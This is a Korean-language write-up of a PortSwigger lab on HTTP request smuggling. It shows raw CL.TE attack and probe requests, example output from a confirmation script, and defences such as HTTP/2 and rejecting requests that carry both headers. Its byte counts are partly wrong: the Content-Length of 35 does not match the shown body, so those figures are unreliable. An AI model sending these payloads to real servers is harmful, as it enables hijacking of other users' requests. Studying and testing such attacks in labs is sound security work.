# Lab: HTTP request smuggling, confirming a CL.TE vulnerability via differential responses

## 개요

- **난이도**: Practitioner
- **주제**: HTTP Request Smuggling — CL.TE / Content-Length vs Transfer-Encoding / Differential Response
- **링크**: https://portswigger.net/web-security/request-smuggling/finding/lab-confirming-cl-te-via-differential-responses

## 목표

프론트엔드는 `Content-Length`, 백엔드는 `Transfer-Encoding: chunked` 를 기준으로 요청을 처리하는 CL.TE 구조에서, 스머글링된 요청이 다음 프로브 요청에 영향을 주어 다른 응답(404)이 반환되는 것을 확인한다.

## HTTP Request Smuggling 기초

### 프론트엔드 / 백엔드 구조

```
[클라이언트]
    ↓ HTTP 요청 전송
[프론트엔드 서버 (리버스 프록시 / CDN / 로드밸런서)]
    ↓ 요청을 파싱한 뒤 백엔드로 전달
[백엔드 서버 (실제 애플리케이션)]
    ↓ 응답 반환
[프론트엔드 서버]
    ↓
[클라이언트]

문제: 프론트엔드와 백엔드가 요청 경계를 다르게 파악하면
      하나의 요청이 두 개로 분리되거나
      다음 요청의 앞부분이 이전 요청의 body 로 처리된다.
```

### Content-Length vs Transfer-Encoding

```
[Content-Length]
  요청 body 의 바이트 수를 명시
  서버는 해당 바이트 수만큼 읽으면 요청 종료로 판단

  POST / HTTP/1.1
  Content-Length: 13
  \r\n
  Hello, World!      ← 13바이트, 여기서 요청 종료

[Transfer-Encoding: chunked]
  body 를 청크 단위로 전송
  각 청크는 [크기(hex)]\r\n[데이터]\r\n 형식
  크기가 0 인 청크(0\r\n\r\n)가 나오면 종료

  POST / HTTP/1.1
  Transfer-Encoding: chunked
  \r\n
  5\r\n              ← 청크 크기: 5바이트
  Hello\r\n          ← 청크 데이터
  0\r\n              ← 종료 청크
  \r\n
```

## CL.TE 취약점 원리

```
[CL.TE 구조]
  프론트엔드: Content-Length 사용
  백엔드:    Transfer-Encoding: chunked 사용

[공격 요청]
  POST / HTTP/1.1
  Content-Length: 35       ← 프론트엔드 기준: body 35바이트 전체 전달
  Transfer-Encoding: chunked

  0\r\n                    ← 백엔드 기준: 청크 종료! (4바이트)
  \r\n
  GET /404page HTTP/1.1\r\n  ← 백엔드 버퍼에 잔류
  X-Smuggled: x

[프론트엔드 처리]
  Content-Length = 35 → body 35바이트 전체를 백엔드로 전달

[백엔드 처리]
  Transfer-Encoding: chunked 기준으로 파싱
  → '0\r\n\r\n' 에서 청크 종료
  → 이후 남은 바이트('GET /404page...')는 버퍼에 보관

[다음 요청 도착 시]
  일반 GET / 요청이 도착
  → 백엔드는 버퍼 내용 + 새 요청을 이어 붙여 파싱
  → 'GET /404page HTTP/1.1\r\nX-Smuggled: xGET / HTTP/1.1\r\n...'
  → 404 Not Found 응답 반환
```

## 공격 패킷

### Attack 요청 (스머글링 심기)

```http
POST / HTTP/1.1
Host: LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 35
Transfer-Encoding: chunked

0

GET /404notfound HTTP/1.1
X-Smuggled: x
```

```
body 분석:
  "0\r\n\r\nGET /404notfound HTTP/1.1\r\nX-Smuggled: x"

  Content-Length 35: 프론트엔드가 위 35바이트 전체를 백엔드로 전달
  Transfer-Encoding: 백엔드는 '0\r\n\r\n'(4바이트)에서 청크 종료
                     나머지 31바이트는 버퍼에 보관
```

### Probe 요청 (Differential Response 확인)

```http
GET / HTTP/1.1
Host: LAB-ID.web-security-academy.net
Connection: close
```

```
백엔드에서의 실제 처리:
  버퍼 내용 + Probe 요청이 합쳐짐:

  GET /404notfound HTTP/1.1
  X-Smuggled: xGET / HTTP/1.1
  Host: LAB-ID.web-security-academy.net
  ...

  → /404notfound 경로로 처리 → 404 Not Found 반환
  → 정상 응답(200)과 다름 → CL.TE 취약점 확인!
```

## 도구 사용

```bash
python3 tools/09-cl-te-confirm.py \
  --host LAB-ID.web-security-academy.net \
  --smuggle-path /404notfound \
  --repeat 5

출력 예시:
  [*] 기준선: HTTP/1.1 200 OK
  [01] Attack: HTTP/1.1 200 OK   Probe: HTTP/1.1 404 Not Found  [★ DIFFERENT]
  [02] Attack: HTTP/1.1 200 OK   Probe: HTTP/1.1 404 Not Found  [★ DIFFERENT]
  ...
  [+] CL.TE 취약점 확인! (4/5회 differential response 발생)
```

## 왜 두 개의 응답이 반환되는가

```
[일반적인 HTTP 파이프라이닝]
  요청 A → 응답 A
  요청 B → 응답 B

[CL.TE 스머글링 발생 시]
  Attack 요청 (스머글링 심기) → 응답 A
  Probe 요청 도착
    → 백엔드 버퍼 내용(GET /404) + Probe 요청이 합쳐짐
    → 백엔드: GET /404 → 응답 B1 (404)
    → 백엔드: 나머지(원래 Probe) → 응답 B2 (200)
    → 클라이언트는 응답 B1(404)을 받음

결과:
  정상 요청인데 404 가 오면 → 스머글링 성공
  (응답 수와 요청 수가 어긋나는 현상)
```

## 방어

```
[근본 원인]
  프론트엔드와 백엔드가 요청 경계를 다르게 파악

[방어 방법]
  1. HTTP/2 사용
     HTTP/2 는 바이너리 프레이밍으로 요청 경계를 명확히 구분
     CL/TE 기반 모호성 없음

  2. 백엔드 연결 재사용 비활성화
     요청마다 새 TCP 연결 → 버퍼 잔류 불가
     성능 저하 있음

  3. 프론트엔드/백엔드 동일 파싱 기준 사용
     둘 다 TE 또는 둘 다 CL 사용
     TE 우선 처리가 RFC 7230 표준

  4. 두 헤더 동시 존재 시 요청 거부
     Content-Length + Transfer-Encoding 조합 차단
```

## 핵심 정리

- CL.TE 스머글링은 프론트엔드(CL)와 백엔드(TE)의 **요청 경계 인식 차이**를 이용한다.
- 청크 종료(`0\r\n\r\n`) 이후의 바이트가 **백엔드 버퍼에 잔류**하여 다음 요청의 앞부분이 된다.
- Differential Response 확인 방법: Attack 전송 후 Probe 전송 → 정상과 다른 응답(404 등)이 오면 취약점 존재.
- `requests` 라이브러리는 헤더를 정규화하므로 스머글링 패킷은 **raw 소켓**으로 직접 전송해야 한다.

## 배운 점 및 추가 학습

### 1. CL.TE vs TE.CL

```
[CL.TE — 이번 랩]
  프론트엔드: Content-Length 사용
  백엔드:    Transfer-Encoding 사용
  → 백엔드가 TE 로 청크 종료 후 남은 바이트를 버퍼에 보관

[TE.CL]
  프론트엔드: Transfer-Encoding 사용
  백엔드:    Content-Length 사용
  → 프론트엔드가 청크를 이어붙여 전달하면
    백엔드(CL)는 Content-Length 만큼만 읽고 나머지를 다음 요청으로 처리

[TE.TE]
  양쪽 모두 Transfer-Encoding 지원하지만
  한쪽이 obfuscated TE 헤더를 무시하도록 유도
  예: Transfer-Encoding: xchunked, Transfer-Encoding : chunked
```

### 2. Chunked 인코딩 구조

```
청크 형식:
  [크기(16진수)]\r\n
  [데이터]\r\n
  ...
  0\r\n       ← 마지막 청크 (크기 0)
  \r\n        ← 청크 종료

예시:
  a\r\n       ← 10바이트
  0123456789\r\n
  5\r\n       ← 5바이트
  abcde\r\n
  0\r\n       ← 종료
  \r\n
```

### 3. 스머글링 탐지 시 유의사항

```
- Differential response 확인 시 같은 타이밍에 다른 사용자 요청이
  영향받을 수 있음 → 운영 환경에서는 주의 필요

- 반복 시도가 필요한 이유:
  커넥션 풀링으로 Attack 과 Probe 가 다른 백엔드로 갈 수 있음
  → 여러 번 시도해서 같은 백엔드에 도달할 때 확인

- 타임아웃 발생 시 TE.CL 가능성 검토:
  TE.CL 에서는 백엔드가 Content-Length 만큼 기다리다 타임아웃
```
